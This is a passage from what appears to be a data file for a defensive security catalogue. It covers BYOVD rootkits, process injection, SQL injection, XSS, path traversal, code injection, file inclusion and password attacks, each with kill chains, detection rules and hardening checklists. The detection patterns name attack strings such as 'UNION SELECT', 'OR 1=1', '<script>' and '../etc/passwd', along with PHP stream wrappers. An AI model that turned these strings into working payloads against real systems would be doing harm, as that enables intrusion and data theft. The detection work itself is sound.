        "Unexpected termination of EDR kernel callbacks or sudden unhooking of PsSetCreateProcessNotifyRoutine"
      ]
    },
    rules: {
      sigma: `title: Suspicious Kernel Driver Load via Known Vulnerable Driver (BYOVD)
id: d1e2f3a4-b5c6-7d8e-9f0a-1b2c3d4e5f6a
status: production
description: Detects loading of known vulnerable signed drivers frequently abused in BYOVD rootkit attacks.
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 6
        ImageLoaded|endswith:
            - '\\RTCore64.sys'
            - '\\procexp.sys'
            - '\\mhyprot2.sys'
            - '\\gdrv.sys'
    condition: selection
fields:
    - ImageLoaded
    - Hashes
    - Signed
level: critical
tags:
    - attack.defense_evasion
    - attack.t1014`,
      splunk: `index=sysmon EventCode=6 (ImageLoaded="*\\\\RTCore64.sys" OR ImageLoaded="*\\\\mhyprot2.sys" OR ImageLoaded="*\\\\gdrv.sys")
| eval Alert="CRITICAL: Known Vulnerable Driver Loaded - Suspected BYOVD Rootkit"
| table _time, Computer, ImageLoaded, Hashes, Signature, Alert`,
      suricata: `alert dns $HOME_NET any -> any 53 (
    msg:"SEC-ALERT Rootkit Dynamic DNS C2 Beaconing";
    dns.query; content:"rootkit-c2";
    classtype:trojan-activity;
    sid:1000009;
    rev:1;
)`,
      sysmon: `# Query loaded kernel drivers and verify digital signatures
Get-WmiObject Win32_SystemDriver | Where-Object {$_.State -eq 'Running'} | Select-Object Name, DisplayName, PathName`
    },
    defenseChecklist: [
      { id: "root_1", title: "Enable UEFI Secure Boot", tier: "Firmware", desc: "Enforce hardware root-of-trust with UEFI Secure Boot to prevent unsigned bootkits and bootloader tampering." },
      { id: "root_2", title: "Enforce Driver Blocklist (HVCI)", tier: "OS Kernel", desc: "Deploy Hypervisor-Protected Code Integrity (HVCI) and the Microsoft Vulnerable Driver Blocklist to stop BYOVD attacks." },
      { id: "root_3", title: "Deploy eBPF Monitoring", tier: "Linux", desc: "Implement eBPF runtime security sensors (Tetragon, Falco) to detect syscall manipulation and rootkit hooks." },
      { id: "root_4", title: "Kernel Patch Protection", tier: "OS Level", desc: "Ensure Kernel Patch Protection (PatchGuard) is active and alert on any runtime modification of SSDT handlers." }
    ]
  },

  {
    num: 10,
    id: "process-injection",
    name: "Process Injection",
    shortName: "Process Injection",
    moduleGroup: "os",
    module: "Operating System Attacks",
    category: "process-injection",
    severity: "high",
    cvss: "8.6",
    mitre: "T1055, T1055.001, T1055.002, T1055.012",
    primaryTargets: "explorer.exe, svchost.exe, lsass.exe, spoolsv.exe, Legitimate Desktop Apps",
    threatActors: "Cobalt Strike Operators, Emotet, QakBot, APT41, FIN7",
    summary: "Process Injection is a widespread evasion technique where malicious code is executed inside the virtual address space of a separate, legitimate, running operating system process. Techniques include DLL Injection, Process Hollowing (RunPE), APC Queue Injection, and Thread Hijacking. This allows malicious payloads to masquerade as trusted binaries, inherit their access privileges, and bypass firewall egress filtering.",
    killChain: [
      {
        step: 1,
        title: "Target Process Access Acquisition",
        mitre: "T1057",
        desc: "Adversary acquires a process handle using OpenProcess with PROCESS_VM_WRITE and PROCESS_VM_OPERATION."
      },
      {
        step: 2,
        title: "Remote Memory Allocation & Write",
        mitre: "T1055.002",
        desc: "Allocating executable memory in the target process using VirtualAllocEx and copying shellcode via WriteProcessMemory."
      },
      {
        step: 3,
        title: "Thread Creation or Process Hollowing",
        mitre: "T1055.012",
        desc: "Executing the injected payload via CreateRemoteThread, QueueUserAPC, or overwriting legitimate thread context."
      }
    ],
    telemetry: {
      sources: [
        "Sysmon Event ID 8 (CreateRemoteThread detected)",
        "Sysmon Event ID 10 (ProcessAccess with granted access rights 0x1F0FFF or 0x147A)",
        "EDR Memory Scanning (Detection of unbacked executable memory regions: PAGE_EXECUTE_READWRITE without disk image)"
      ],
      anomalies: [
        "Non-system process opening high-privilege access handles to lsass.exe, svchost.exe, or explorer.exe",
        "CreateRemoteThread initiated by untrusted executable targeting a native Windows OS process",
        "Memory pages with RWX permissions lacking an associated DLL file on disk"
      ]
    },
    rules: {
      sigma: `title: Sysmon CreateRemoteThread into Legitimate System Process
id: f5e4d3c2-b1a0-9e8d-7c6b-5a4b3c2d1e0f
status: production
description: Detects creation of a remote thread targeting critical processes (svchost, explorer, lsass) indicating process injection.
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 8
        TargetImage|endswith:
            - '\\explorer.exe'
            - '\\svchost.exe'
            - '\\lsass.exe'
            - '\\spoolsv.exe'
    condition: selection
level: critical
tags:
    - attack.defense_evasion
    - attack.t1055`,
      splunk: `index=sysmon EventCode=8 
(TargetImage="*\\\\explorer.exe" OR TargetImage="*\\\\svchost.exe" OR TargetImage="*\\\\lsass.exe")
NOT SourceImage="*\\\\csrss.exe"
| eval Alert="CRITICAL: CreateRemoteThread Detected - Probable Process Injection"
| table _time, Computer, SourceImage, TargetImage, StartAddress, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (
    msg:"SEC-ALERT Suspicious Process Beacon from Injected System Binary";
    flow:established,to_server;
    content:"POST /api/v1/ping"; http_uri;
    classtype:trojan-activity;
    sid:1000010;
    rev:1;
)`,
      sysmon: `# Query Sysmon for recent remote thread injections
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=8} -MaxEvents 50 | 
  Format-Table TimeCreated, Id, @{N='Source';E={$_.Properties[4].Value}}, @{N='Target';E={$_.Properties[5].Value}}`
    },
    defenseChecklist: [
      { id: "inj_1", title: "Enable Arbitrary Code Guard (ACG)", tier: "OS Hardening", desc: "Enforce ACG and Process Dynamic Code Blocker via Exploit Protection to prevent threads from writing to executable memory." },
      { id: "inj_2", title: "Enable EDR In-Memory Scanning", tier: "EDR", desc: "Deploy EDR solutions with real-time memory scanning (inspecting thread stacks, hooked APIs, and unbacked memory pages)." },
      { id: "inj_3", title: "Restrict SeDebugPrivilege", tier: "Identity", desc: "Ensure SeDebugPrivilege is stripped from standard users and service accounts to prevent calling OpenProcess." },
      { id: "inj_4", title: "Deploy ASR Rules", tier: "Endpoint", desc: "Enable Windows Defender ASR rule: 'Block credential stealing from the Windows local security authority subsystem (lsass.exe)'." }
    ]
  },

  // =========================================================================
  // MODULE 3: APPLICATION AND SPECIALIZED ATTACKS (11 - 15)
  // =========================================================================
  {
    num: 11,
    id: "sql-injection",
    name: "SQL Injection (SQLi)",
    shortName: "SQL Injection",
    moduleGroup: "app",
    module: "Application and Specialized Attacks",
    category: "sql-injection",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1190, CWE-89",
    primaryTargets: "Relational Databases (PostgreSQL, MySQL, MS SQL, Oracle), Web Authentication, ERP Backends",
    threatActors: "FIN7, Anonymous, Web Scraping Bots, Database Ransomware Cartels",
    summary: "SQL Injection occurs when untrusted client data is concatenated directly into SQL queries without proper sanitization or parameterization. Adversaries manipulate query syntax using boolean logic, UNION statements, or stacked queries to bypass authentication, dump database records (PII, credentials, payment data), alter transactions, or execute OS commands through database extensions like xp_cmdshell.",
    killChain: [
      {
        step: 1,
        title: "SQL Delimiter Injection & Error Testing",
        mitre: "T1190",
        desc: "Injecting single quotes, comments, or logical conditions into form fields or URL parameters to trigger SQL syntax errors."
      },
      {
        step: 2,
        title: "Schema Enumeration & Table Discovery",
        mitre: "T1083",
        desc: "Extracting table structures and column definitions using UNION SELECT from information_schema."
      },
      {
        step: 3,
        title: "Bulk Credential Dump & Database RCE",
        mitre: "T1005",
        desc: "Dumping password hashes or invoking database shell routines to gain OS-level execution."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Firewall (WAF) Logs (ModSecurity, Cloudflare, AWS WAF SQLi signature triggers)",
        "Web Server Access Logs (Nginx/Apache logs with quotes, UNION, SELECT in query strings, HTTP 500)",
        "Database Audit Logs (pg_stat_statements, MySQL general_log showing abnormal UNION queries or xp_cmdshell)"
      ],
      anomalies: [
        "Surge in HTTP 500 Internal Server Errors accompanied by SQL keywords in GET/POST request URIs",
        "Single client generating thousands of rapid queries manipulating query parameter lengths",
        "Execution of administrative database procedures (xp_cmdshell, sp_configure, INTO OUTFILE) by web application users"
      ]
    },
    rules: {
      sigma: `title: SQL Injection Patterns in Web Server Access Request
id: a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6e
status: production
description: Detects classical SQL injection strings (UNION SELECT, boolean tautologies, stacked queries) in HTTP request URLs.
logsource:
    category: webserver
detection:
    selection:
        cs-method:
            - 'GET'
            - 'POST'
        cs-uri-query|contains:
            - 'UNION%20SELECT'
            - 'UNION+SELECT'
            - 'OR%201=1'
            - 'OR+1=1'
            - '--'
            - 'waitfor%20delay'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=waf (rule_id="942*" OR action="blocked")
| stats count by client_ip, uri, rule_id, rule_message
| where count > 5
| eval Alert="CRITICAL: WAF SQL Injection Attack Detected"
| table _time, client_ip, uri, rule_id, rule_message, count, Alert`,
      suricata: `alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (
    msg:"SEC-ALERT SQL Injection Attempt - UNION SELECT in URI";
    flow:to_server,established;
    http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0;
    classtype:web-application-attack;
    sid:1000011;
    rev:1;
)`,
      sysmon: `# Audit web access logs for SQL injection patterns
grep -Ei "(union.*select|waitfor.*delay|information_schema|order.*by)" /var/log/nginx/access.log | head -n 20`
    },
    defenseChecklist: [
      { id: "sql_1", title: "Mandatory Parameterized Queries", tier: "Application", desc: "Enforce parameterized queries or ORM abstractions (Hibernate, Prisma, Entity Framework) across all database interactions." },
      { id: "sql_2", title: "Principle of Least Privilege for DB User", tier: "Database", desc: "Ensure web application database accounts lack DROP TABLE, ALTER, and xp_cmdshell administrative privileges." },
      { id: "sql_3", title: "Deploy Web Application Firewall (WAF)", tier: "Network/WAF", desc: "Deploy WAF with active OWASP Core Rule Set (CRS) to block malicious SQL syntax before reaching backend servers." },
      { id: "sql_4", title: "Database Activity Monitoring (DAM)", tier: "Monitoring", desc: "Monitor and alert on abnormal query patterns, bulk row exfiltration, and out-of-band database connections." }
    ]
  },

  {
    num: 12,
    id: "xss",
    name: "Cross-Site Scripting (XSS)",
    shortName: "Cross-Site Scripting",
    moduleGroup: "app",
    module: "Application and Specialized Attacks",
    category: "xss",
    severity: "high",
    cvss: "7.2",
    mitre: "T1189, CWE-79",
    primaryTargets: "Web Browsers, Session Storage, Authentication Cookies, Single-Page Apps (React/Vue/Angular)",
    threatActors: "Magecart (Digital Skimming), Initial Access Brokers, Phishing Operators",
    summary: "Cross-Site Scripting (XSS) vulnerabilities occur when web applications include untrusted user input in web pages without proper validation or contextual output encoding. Attackers inject malicious client-side scripts (JavaScript) executed in the victim's browser context, enabling session cookie theft, credential harvesting via fake overlays, DOM defacement, or forced transactions on behalf of authenticated users.",
    killChain: [
      {
        step: 1,
        title: "Contextual Injection Probing",
        mitre: "T1189",
        desc: "Submitting special HTML characters (<, >, \", ') into search fields or comments to observe unencoded reflection."
      },
      {
        step: 2,
        title: "Payload Weaponization (Cookie Theft & Hooking)",
        mitre: "T1059.007",
        desc: "Constructing weaponized script payloads to capture session tokens and forward them to an attacker drop-server."
      },
      {
        step: 3,
        title: "Account Takeover & Unauthorized Actions",
        mitre: "T1539",
        desc: "Adversary imports stolen session cookie into their browser to assume the victim's authenticated identity."
      }
    ],
    telemetry: {
      sources: [
        "Content Security Policy (CSP) Violation Reports (Endpoints listening for report-to / report-uri directives)",
        "Web Application Firewall Logs (Detection of script tags, onerror handlers, or javascript: URIs)",
        "Client-side EDR / Browser Monitoring"
      ],
      anomalies: [
        "Spike in CSP violation reports citing inline script execution attempts on specific URLs",
        "WAF alerts triggering on HTML tags inside HTTP query or POST parameters",
        "Outbound client connections from browser sessions to unvetted third-party domains"
      ]
    },
    rules: {
      sigma: `title: Potential Cross-Site Scripting (XSS) in HTTP Request
id: b2c3d4e5-f6a7-8b9c-0d1e-2f3a4b5c6d7e
status: production
description: Detects standard XSS payload markers in URI queries and parameters.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - '<script>'
            - '%3Cscript%3E'
            - 'javascript:'
            - 'onload='
            - 'onerror='
            - '<img%20src='
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1189`,
      splunk: `index=waf (rule_id="941*" OR action="blocked")
| stats count by client_ip, uri, rule_message
| where count > 5
| eval Alert="HIGH: Cross-Site Scripting Attack Blocked by WAF"
| table _time, client_ip, uri, rule_message, count, Alert`,
      suricata: `alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (
    msg:"SEC-ALERT Cross-Site Scripting (XSS) Injected in HTTP Parameter";
    flow:to_server,established;
    http.uri; content:"<script>"; nocase;
    classtype:web-application-attack;
    sid:1000012;
    rev:1;
)`,
      sysmon: `# Search web logs for XSS injection probes
grep -Ei "(<script|javascript:|onerror=|onload=|<svg)" /var/log/nginx/access.log | head -n 15`
    },
    defenseChecklist: [
      { id: "xss_1", title: "Strict Content Security Policy", tier: "Web Headers", desc: "Implement CSP with 'strict-dynamic' and cryptographic nonces (script-src 'nonce-...') to ban inline script execution." },
      { id: "xss_2", title: "Context-Aware Output Encoding", tier: "Application", desc: "Utilize automatic contextual encoding frameworks (React, Angular) and sanitize HTML input with DOMPurify." },
      { id: "xss_3", title: "Configure HttpOnly & SameSite", tier: "Session Security", desc: "Mark all session and authentication cookies with HttpOnly, Secure, and SameSite=Strict/Lax." },
      { id: "xss_4", title: "WAF XSS Filtering Rules", tier: "WAF", desc: "Enable OWASP Core Rule Set XSS protection rulesets on reverse proxies and CDNs." }
    ]
  },

  {
    num: 13,
    id: "directory-traversal",
    name: "Directory Traversal (Path Traversal)",
    shortName: "Directory Traversal",
    moduleGroup: "app",
    module: "Application and Specialized Attacks",
    category: "directory-traversal",
    severity: "high",
    cvss: "7.5",
    mitre: "T1083, CWE-22",
    primaryTargets: "Web Servers (Apache, Nginx, IIS), API File Download Endpoints, Static File Handlers",
    threatActors: "Automated Vulnerability Scanners, APT Groups, Cyber Extortionists",
    summary: "Directory Traversal (also known as Path Traversal) exploits insufficient validation of user-supplied filenames. By inserting dot-dot-slash sequences ('../', '..\\', or URL-encoded equivalents '%2e%2e%2f'), attackers escape the intended web document root directory to read arbitrary operating system files, including sensitive configurations, credentials, source code, /etc/passwd, or Windows SAM hives.",
    killChain: [
      {
        step: 1,
        title: "File Download Endpoint Discovery",
        mitre: "T1083",
        desc: "Locating endpoints that take filenames as parameters: e.g. GET /download?file=statement.pdf."
      },
      {
        step: 2,
        title: "Dot-Dot-Slash Sequence Injection",
        mitre: "T1083",
        desc: "Injecting multiple traversal steps with encoding bypasses to reach the filesystem root."
      },
      {
        step: 3,
        title: "Configuration & Key Extraction",
        mitre: "T1005",
        desc: "Retrieving critical configuration files containing database passwords (.env, web.config, id_rsa)."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (URI queries containing ../, ..%2f, or %2e%2e%2f)",
        "File System Auditing / EDR (Web server process w3wp.exe or nginx opening files outside document root)",
        "WAF Request Inspection Logs"
      ],
      anomalies: [
        "HTTP 200 responses to requests with nested ../ paths targeting system configuration files",
        "Unusual file access events on /etc/passwd, /etc/shadow, or C:\\Windows\\win.ini initiated by web daemon",
        "High-volume directory brute-forcing targeting backup and config files (.git, .env, id_rsa)"
      ]
    },
    rules: {
      sigma: `title: Directory Traversal Pattern in Web Server URL
id: c3d4e5f6-a7b8-9c0d-1e2f-3a4b5c6d7e8f
status: production
description: Detects path traversal sequences (dot-dot-slash) attempting to escape web root directories.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains:
            - '/../'
            - '/..%2f'
            - '%2e%2e%2f'
            - '%2e%2e/'
            - '..\\..'
    condition: selection
level: high
tags:
    - attack.discovery
    - attack.t1083`,
      splunk: `index=web_access uri="*../*" OR uri="*%2e%2e*" OR uri="*..\\\\*"
| stats count by client_ip, uri, status
| where count > 3
| eval Alert="HIGH: Directory Traversal Attempt Detected in Web Access Log"
| table _time, client_ip, uri, status, count, Alert`,
      suricata: `alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (
    msg:"SEC-ALERT Directory Traversal Attempt (etc/passwd access)";
    flow:to_server,established;
    http.uri; content:"../"; content:"etc/passwd"; distance:0;
    classtype:web-application-attack;
    sid:1000013;
    rev:1;
)`,
      sysmon: `# Search web server access logs for path traversal attempts
grep -E "(\\.\\./|\\.\\.%2f|%2e%2e%2f|/etc/passwd)" /var/log/nginx/access.log | head -n 15`
    },
    defenseChecklist: [
      { id: "dir_1", title: "Canonicalize & Whitelist Paths", tier: "Application", desc: "Resolve canonical absolute paths before file access and strictly verify the target path stays within the base directory." },
      { id: "dir_2", title: "Use Indirect Reference Maps", tier: "Architecture", desc: "Avoid direct filesystem paths in parameters; use database IDs or UUIDs mapping to stored files." },
      { id: "dir_3", title: "Chroot / Container Isolation", tier: "OS/Infrastructure", desc: "Run web daemons in minimal chroot jails or distroless containers with read-only root filesystems." },
      { id: "dir_4", title: "Strict File System Permissions", tier: "OS Level", desc: "Ensure the web service user lacks read access to system files and environment configs." }
    ]
  },

  {
    num: 14,
    id: "code-injection",
    name: "Code Injection (Command & Server-Side Injection)",
    shortName: "Code Injection",
    moduleGroup: "app",
    module: "Application and Specialized Attacks",
    category: "code-injection",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1059, CWE-94, CWE-78",
    primaryTargets: "Web Application Interpreters (Node.js, Python, PHP, Ruby), Command Shells, CI/CD Runners",
    threatActors: "Ransomware Operators, Initial Access Brokers, Botnets (Mirai), Nation-State APTs",
    summary: "Code Injection occurs when untrusted input is passed directly to dynamic evaluation functions (e.g. eval, exec, system, popen, assert) in the application runtime. Attackers break out of the intended execution syntax and inject arbitrary programming instructions or operating system commands, leading to full Remote Code Execution (RCE) with the permissions of the application process.",
    killChain: [
      {
        step: 1,
        title: "Dynamic Evaluator Probing",
        mitre: "T1190",
        desc: "Identifying input fields processed by math parsers, template engines, or system shell utilities."
      },
      {
        step: 2,
        title: "Language Syntax Breakout",
        mitre: "T1059",
        desc: "Injecting semicolons, subshells, or language evaluation statements to execute arbitrary commands."
      },
      {
        step: 3,
        title: "Reverse Shell Spawning",
        mitre: "T1059.004",
        desc: "Spawning an interactive bash or powershell session back to the attacker's command-and-control listener."
      }
    ],
    telemetry: {
      sources: [
        "Sysmon (Event ID 1: Web server spawning cmd.exe, powershell.exe, or /bin/sh)",
        "Linux Auditd (EXECVE calls with parent comm=python, node, or php)",
        "EDR Runtime Application Self-Protection (RASP) Telemetry"
      ],
      anomalies: [
        "Web server daemon spawning a command interpreter child process",
        "Process establishing unexpected outbound TCP connections on high ports",
        "Execution of system enumeration utilities immediately after HTTP POST"
      ]
    },
    rules: {
      sigma: `title: Web Server Spawning Command Shell (Code Injection / RCE)
id: d4e5f6a7-b8c9-0d1e-2f3a-4b5c6d7e8f9a
status: production
description: Detects command shells spawned by web server processes indicating code injection or remote command execution.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith:
            - '\\w3wp.exe'
            - '\\httpd.exe'
            - '\\nginx.exe'
            - '\\node.exe'
            - '\\php-cgi.exe'
        Image|endswith:
            - '\\cmd.exe'
            - '\\powershell.exe'
            - '\\bash.exe'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059`,
      splunk: `index=sysmon EventCode=1 
(ParentImage="*\\\\w3wp.exe" OR ParentImage="*\\\\httpd.exe" OR ParentImage="*\\\\node.exe")
(Image="*\\\\cmd.exe" OR Image="*\\\\powershell.exe" OR Image="*\\\\bash.exe")
| eval Alert="CRITICAL: Web Process Spawned Shell - Suspected Code/Command Injection"
| table _time, Computer, ParentImage, Image, CommandLine, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS any (
    msg:"SEC-ALERT Server-Side Code Injection (PHP/Python eval)";
    flow:to_server,established;
    content:"eval("; nocase; content:"base64_decode"; nocase;
    classtype:web-application-attack;
    sid:1000014;
    rev:1;
)`,
      sysmon: `# Linux auditd log search for shells spawned by web daemons
ausearch -m EXECVE -c nginx,apache2,node -ts recent`
    },
    defenseChecklist: [
      { id: "code_1", title: "Ban Dynamic Code Evaluation", tier: "Application", desc: "Prohibit eval(), exec(), and system() functions in production codebases through static analysis (SAST) linters." },
      { id: "code_2", title: "Strict Input Whitelisting", tier: "Validation", desc: "Enforce strict regular expression whitelisting on all input fields rather than relying on blacklists." },
      { id: "code_3", title: "Deploy RASP", tier: "Runtime", desc: "Integrate Runtime Application Self-Protection (RASP) agents to block unauthorized system calls at runtime." },
      { id: "code_4", title: "Egress Network Filtering", tier: "Perimeter", desc: "Restrict server outbound network traffic to trusted IPs to block reverse shell connections from establishing." }
    ]
  },

  {
    num: 15,
    id: "file-inclusion",
    name: "File Inclusion Attack (LFI / RFI)",
    shortName: "File Inclusion",
    moduleGroup: "app",
    module: "Application and Specialized Attacks",
    category: "file-inclusion",
    severity: "high",
    cvss: "8.6",
    mitre: "T1190, CWE-98",
    primaryTargets: "Web Applications with Dynamic Inclusion (PHP, Template Engines), Content Management Systems",
    threatActors: "Web Shell Operators, Botnet Recruitment Scripts, Nation-State Actors",
    summary: "File Inclusion vulnerabilities (Local File Inclusion / Remote File Inclusion) occur when an application processes user input to build file paths for inclusion mechanisms (such as PHP's include, require, or template loaders) without adequate validation. LFI allows attackers to read internal files or execute code via log poisoning or PHP stream wrappers ('php://filter', 'php://input'). RFI allows inclusion of external scripts hosted on remote malicious servers, leading to instant Remote Code Execution.",
    killChain: [
      {
        step: 1,
        title: "Dynamic Include Parameter Identification",
        mitre: "T1190",
        desc: "Finding parameters handling page templates: e.g. GET /index.php?page=contact."
      },
      {
        step: 2,
        title: "Wrapper Exploitation & Source Code Extraction",
        mitre: "T1059.006",
        desc: "Using base64 filter wrappers to extract server source code without execution."
      },
      {
        step: 3,
        title: "Log Poisoning & Code Execution",
        mitre: "T1059",
        desc: "Injecting PHP code into the User-Agent header, then including the server access log to trigger execution."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (Query strings containing php://, http://, https://, or /var/log/ paths)",
        "PHP Error Logs (Failed include/require warnings with file paths)",
        "WAF Protocol Violation Logs"
      ],
      anomalies: [
        "Presence of URI stream wrappers ('php://filter', 'php://input', 'data://') in query parameters",
        "Inclusion of web server log files or session files via application include statements",
        "Outbound HTTP requests from web servers to external untrusted domains attempting to fetch scripts"
      ]
    },
    rules: {
      sigma: `title: PHP Local/Remote File Inclusion (LFI/RFI) Pattern
id: e5f6a7b8-c9d0-1e2f-3a4b-5c6d7e8f9a0b
status: production
description: Detects PHP stream wrappers and remote HTTP file inclusion attempts in web requests.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - 'php://filter'
            - 'php://input'
            - 'data://'
            - 'http://'
            - 'https://'
            - '/proc/self/environ'
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=web_access (uri="*php://*" OR uri="*data://*" OR uri="*http://*")
| stats count by client_ip, uri, status
| where count > 2
| eval Alert="HIGH: File Inclusion Attempt (LFI/RFI) Detected"
| table _time, client_ip, uri, status, count, Alert`,
      suricata: `alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (
    msg:"SEC-ALERT PHP Local File Inclusion Attempt via php://filter";
    flow:to_server,established;
    http.uri; content:"php://filter"; nocase;
    classtype:web-application-attack;
    sid:1000015;
    rev:1;
)`,
      sysmon: `# Search web logs for stream wrappers and remote inclusion strings
grep -Ei "(php://filter|php://input|data://text|/proc/self/)" /var/log/nginx/access.log | head -n 15`
    },
    defenseChecklist: [
      { id: "lfi_1", title: "Disable allow_url_include", tier: "PHP/Server Config", desc: "Configure php.ini with allow_url_include = Off and allow_url_fopen = Off to prevent remote script execution." },
      { id: "lfi_2", title: "Strict Whitelist of Allowed Files", tier: "Application", desc: "Implement strict whitelist mapping of allowable user-selected pages instead of dynamic filesystem paths." },
      { id: "lfi_3", title: "Restrict File Permissions", tier: "OS Hardening", desc: "Ensure web application worker processes cannot read web server access logs or sensitive system directories." },
      { id: "lfi_4", title: "WAF Rule Enforcement", tier: "Perimeter", desc: "Enable WAF signatures that detect and block stream wrapper syntax and traversal sequences." }
    ]
  },

  // =========================================================================
  // MODULE 4: PASSWORD SECURITY - PASSWORD ATTACKS (31 - 35)
  // =========================================================================
  {
    num: 31,
    id: "brute-force-attack",
    name: "Online Password Brute-Force Attack (Exhaustive Permutations & Lockout Hunting)",
    shortName: "Brute-Force Attack",
    moduleGroup: "password",
    module: "Module 4: Password Security Attacks",
    category: "pwd-attack",
    severity: "high",
    cvss: "7.5",
    mitre: "T1110.001, T1078",
    primaryTargets: "Web Login Endpoints, SSH/RDP Gateways, Basic Auth Interfaces, Active Directory Accounts",
    threatActors: "Automated Internet Scanners, Mirai Botnet, Initial Access Brokers, FIN7",
    summary: "An Online Password Brute-Force Attack is an exhaustive mathematical trial-and-error search systematically generating and submitting every possible permutation of character strings (alphanumeric, lowercase, uppercase, symbols) up to a defined length against an online authentication interface until the valid password is discovered.",
    killChain: [
      {
        step: 1,
        title: "Authentication Interface Fingerprinting",
        mitre: "T1595.002",
        desc: "Scanning target web application endpoints and network services to identify login interfaces (e.g. /login, /api/v1/auth, SSH port 22, RDP port 3389)."
      },
      {
        step: 2,
        title: "Lockout Policy & Rate Limiter Probing",
        mitre: "T1110.001",
        desc: "Dispatching deliberate test login attempts to measure account lockout thresholds, HTTP 429 Too Many Requests triggers, and CAPTCHA challenge criteria."
      },
      {
        step: 3,
        title: "Character Set & Permutation Configuration",
        mitre: "T1110",
        desc: "Configuring the keyspace generator with selected character sets (e.g. [a-zA-Z0-9!@#$]) and bounding length constraints between 4 and 10 characters."
      },
      {
        step: 4,
        title: "High-Throughput Connection Spooling",
        mitre: "T1110.001",
        desc: "Launching multi-threaded automated connection streams dispatching HTTP POST authentication packets or raw protocol handshakes."
      },
      {
        step: 5,
        title: "Response Differential & Success Parsing",
        mitre: "T1078",
        desc: "Analyzing server response codes (200 OK vs 401 Unauthorized), response lengths, and Set-Cookie session headers indicating successful authentication."
      },
      {
        step: 6,
        title: "Session Persistence & Target Compromise",
        mitre: "T1078.002",
        desc: "Persisting the recovered valid credential pair, establishing authenticated remote sessions, and beginning post-authentication reconnaissance."
      }
    ],
    telemetry: {
      sources: [
        "Active Directory Security Logs (Event ID 4625 Failed Logon, Event ID 4740 Account Locked Out)",
        "Web Server Access Logs (Dense clusters of HTTP POST requests to login URIs returning 401/403)",
        "Web Application Firewall (WAF) Logs (Rate limiting trigger events and automated bot alerts)",
        "Linux /var/log/auth.log (Repeated pam_unix authentication failure entries)"
      ],
      anomalies: [
        "Hundreds to thousands of failed authentication attempts against a single username within minutes",
        "Abnormal surge in HTTP POST requests to /login endpoints with minimal inter-request delay",
        "Sudden spike in Active Directory Event ID 4740 (Account Lockout) across multiple user accounts"
      ]
    },
    rules: {
      sigma: `title: High-Velocity Online Authentication Brute Force
id: 1f4a7c29-58b3-4d01-9a72-8ef30a410031
status: stable
description: Detects an abnormal volume of failed login attempts targeting an authentication endpoint indicating brute force activity.
author: SOC Detection Engineering
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4625
        LogonType: 3
    timeframe: 2m
    condition: selection | count(TargetUserName) > 20
fields:
    - TargetUserName
    - IpAddress
    - WorkstationName
level: high
tags:
    - attack.credential_access
    - attack.t1110.001`,
      splunk: `index=windows_security EventCode=4625 Logon_Type=3
| stats count by TargetUserName, IpAddress
| where count > 25
| eval Alert="CRITICAL: Online Password Brute Force Attempt Detected"
| table _time, TargetUserName, IpAddress, count, Alert`,
      suricata: `alert http $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
    msg:"SEC-ALERT High-Rate HTTP Login Brute Force Attempt";
    flow:to_server,established;
    content:"POST"; http_method;
    content:"/login"; http_uri;
    threshold: type both, track by_src, count 20, seconds 10;
    classtype:attempted-login;
    sid:1000031;
    rev:1;
)`,
      sysmon: `# Inspect Active Directory failed logons via PowerShell:
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 20 | Select-Object TimeCreated, Message`
    },
    defenseChecklist: [
      { id: "bf_1", title: "Smart Account Lockout Policies", tier: "Identity Provider", desc: "Deploy Azure AD Smart Lockout or AD lockout thresholds (e.g. 5 attempts with 15-minute lockout windows) to freeze accounts under attack." },
      { id: "bf_2", title: "Mandate Multi-Factor Authentication (MFA)", tier: "Access Control", desc: "Require FIDO2 hardware tokens or TOTP authenticator app verification on all exposed corporate login portals." },
      { id: "bf_3", title: "Adaptive IP Rate Limiting & CAPTCHA", tier: "WAF / Perimeter", desc: "Enforce sliding-window rate limits (max 5 attempts per minute per IP) and trigger Turnstile / CAPTCHA on subsequent attempts." },
      { id: "bf_4", title: "Deprecate Legacy Basic Authentication", tier: "Protocol Hardening", desc: "Disable HTTP Basic Authentication, NTLM over HTTP, and legacy mail protocols (POP3/IMAP) lacking modern authentication support." }
    ]
  },

  {
    num: 32,
    id: "dictionary-attack",
    name: "Password Dictionary Attack (Targeted Wordlist & Breach Corpus Testing)",
    shortName: "Dictionary Attack",
    moduleGroup: "password",
    module: "Module 4: Password Security Attacks",
    category: "pwd-attack",
    severity: "high",
    cvss: "7.8",
    mitre: "T1110.001, T1110.002",
    primaryTargets: "Enterprise SSO Portals, VPN Concentrators, Active Directory, Web Application Portals",
    threatActors: "Lazarus Group, LockBit Gang, FIN7, Script Kiddies",
    summary: "A Password Dictionary Attack systematically cycles through pre-compiled wordlists of common words, leaked password corpora (e.g. RockYou, SecLists, breach compilation dumps), organization-specific terms, and predictable passphrase patterns against targeted user accounts, relying on the statistical prevalence of weak human passwords.",
    killChain: [
      {
        step: 1,
